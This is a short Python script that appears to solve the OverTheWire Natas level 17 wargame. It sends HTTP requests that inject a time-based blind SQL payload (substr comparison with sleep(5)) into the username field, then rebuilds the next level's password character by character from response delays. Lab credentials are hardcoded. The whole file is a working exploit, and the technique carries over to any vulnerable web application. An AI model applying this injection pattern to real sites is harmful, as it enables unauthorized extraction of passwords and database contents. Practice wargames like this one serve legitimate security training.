import requests
import sys
import time

password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDj"

while len(password) < 32:
	print 'Finding character in position: %d' % (len(password)+1)
	for char in list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'):
		start_time = time.time()
		res = requests.get('http://natas17.natas.labs.overthewire.org/index.php?username=natas18" and if(binary substr(password, %d, 1) = \'%s\', sleep(5), null) union select 1,"2' % (len(password)+1, char), auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
		if (time.time() - start_time) > 2:
			password += char
			print 'Current password:', password
			break

print 'nastas18:%s' % password